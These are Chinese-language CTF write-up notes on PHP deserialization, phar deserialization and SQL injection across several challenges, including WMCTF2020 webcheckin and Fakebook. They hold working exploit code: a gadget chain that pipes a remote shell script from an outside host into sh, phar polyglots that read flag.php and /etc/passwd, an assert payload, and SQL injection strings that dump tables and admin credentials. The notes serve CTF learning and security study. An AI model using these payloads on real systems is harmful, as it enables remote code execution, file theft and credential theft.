# PHP反序列化

# 反序列化

### ****[WMCTF2020]webcheckin****

www.zip源码泄露，写在脸上的反序列化

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled.png)

全局搜索function __destruct唯一可以利用的是ws.php中的

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%201.png)

```php
function __destruct() {
        if (isset($this->server->events['disconnect']) &&
            is_callable($func=$this->server->events['disconnect']))
            $func($this);
    }
```

向上看有一个fetch方法，可以作为跳板方法read()可以触发__call

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%202.png)

这个call函数直接调用了 call_user_func_array且$func和$args可控

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%203.png)

\CLI\Agent::__destruct()->\CLI\Agen::fetch()->DB\SQL\Mapper::__call()

链子到这里利用就结束了，但是值得注意的是，再这里我们需要的是Agent类。但是，如果直接构造Agent类的话autoload机制就会去加载cli/agent.php，这样显然是会失败的，只能先构造一个ws类，让他加载ws.php

```php
<?php
namespace DB\SQL{
    class Mapper{
        protected $props = array();
        public function __construct()
        {
            $this->props["read"] = "system";
        }
    }
}
namespace CLI{
    class Agent{
        protected $server;
        protected $socket;
        public function __construct($a)
        {
            $this->server = $a;
            $this->socket = "curl https://your-shell.com/49.232.206.37:23456 | sh";
        }
    }
    class WS{
        protected $addr;
        public function __construct()
        {
            $this->addr = new Agent(new \Auth());
        }
    }
}
namespace {
    class Auth{
        public $events = array();
        public function __construct()
        {
            $this->events['disconnect'] = array(new CLI\Agent(new DB\SQL\Mapper()), "fetch");
        }
    }
    echo urlencode(serialize(new CLI\WS()));
}
```

最后这个Auth是似乎是随意的类都可以，不管是否有event这个值都要塞进去，不是很明白，但是在下面这篇文章中相同的链子是用了Log类来为even[]变量赋值为array("disconnect"=>array($b,'fetch')), array($b,'fetch')即为fentch，其中$b为fetch的所属类

这个其余几条链子的讲解

[fatfree3.7.2反序列化探析 - View of Thai](https://www.viewofthai.link/2022/08/07/fatfree3-7-2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%8e%a2%e6%9e%90/)

### phar反序列化

### ****[Chaos Communication Camp 2019]PDFCreator****

大概功能就是能够将上传的图片文件转化为PDF

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%204.png)

6.2.13这个版本存在上面的CVE，就是可以在PDF中插入html代码，同时绕过src插入为phar可以引发phar反序列化

那么只需要生成phar文件就可以了，值得注意的是phar的攻击点和命名空间的问题

PDFCreator类是PDFStuff空间下的所以phar也要在PDFStuff下生成

```php
else if (isset($_POST["pdfcontent"]))
{
	$creator = new \PDFStuff\PDFCreator();
	$creator->createPdf($_POST["pdfcontent"]);
}
?>
```

phar的攻击位置，creator.php中有

```php
function \_\_destruct()
 {
    if (file_exists($this->tmpfile))
 {
$info = pathinfo($this->tmpfile);
if ($info['extension'] == "pdf")
{
	unlink($this->tmpfile);
}
else
{
	echo "Could not delete created PDF: Not a pdf. Check the file: " . file_get_contents($this->tmpfile);
}
 }
 }
```

Poc

```php
<?php
namespace PDFStuff {
    class PDFCreator
    {
        public $tmpfile = "/var/www/site/flag.php";
    }

    $phar = new \Phar("phar.phar");
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>");
    $o = new PDFCreator();
    $phar->setMetadata($o);
    $phar->stopBuffering();
    rename('phar.phar', 'exp.jpg');

}
```

生成后在pdfcontent插入phar://./upload/b0ab0254bd58eb87eaee3172ba49fefb.jpg

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%205.png)

在f12里

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%206.png)

exp

```php
<?php
class Easytest{
	protected $test = "1";

}

class Main{
	public $url = "file:///etc/passwd";
}

$a = new Easytest();

echo urlencode(serialize($a));

$b = new Main();

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'. '<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($b);
$phar->addFromString('text.txt', 'test');
$phar->stopBuffering();
```

上传位置

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%207.png)

File is an image - image/gif.The file f1dc882dbe.png has been uploaded to ./uploads/

[https://www.notion.so](https://www.notion.so)

在/proc/net/arp找到了内网信息

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%208.png)

### ****[NPUCTF2020]ReadlezPHP****

F12

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%209.png)

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

EXP

```php
<?php  

class HelloPhp
{
    public $a = "phpinfo()";
    public $b = "assert";
}

$a = serialize(new HelloPhp);
echo $a;
?>
```

ban了system

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2010.png)

里面有flag

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2011.png)

### ****[网鼎杯 2018]Fakebook****

御剑开扫，啥也没到

注册一下

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2012.png)

在首页可以看url，猜测是sql，所以重新抓了一个注册包来看看注册的参数

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2013.png)

sql注入的时候发生了奇怪的事情，burp会返回400，但是在浏览器中不影响，本来认为是url编码的问题但是在调了url编码输入后还是一样

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2014.png)

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2015.png)

发现有过滤，union select

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2016.png)

回显里有一个unserialize()

- 爆库：no=-1 union all select 1,database(),3,4#
    - fakebook
- 爆表：no=-1 union all select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#
    - users
- 爆字段：no=-1 union all select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
    - no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
- 爆内容：no=-1 union all select 1,data,3,4 from users#

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2017.png)

发现确实是反序列化，那应该是存在源码泄露的

dirsearch扫了一下

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2018.png)

存在user.php.bak

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

一开始认为需要构造序列化的链子但其实可以直接用之前爆出来的序列化数据改一下，配合伪协议直接拿到数据，但前提是你得知道存在flag.php这个文件

O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:”file:///var/www/html/flag.php”;}

- no=-1 union all select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:”file:///var/www/html/flag.php”;}'#

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2019.png)

**其他解：**

直接sql注入load_file

- no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2020.png)

### ****[RoarCTF 2019]PHPShe****

PHPShe1.7漏洞

SQL和XML

/include/plugin/payment/alipay/pay.php?id=pay%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_

![Untitled](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20d90af503f8914fd0b2d3439c30147b00/Untitled%2021.png)

***altman777***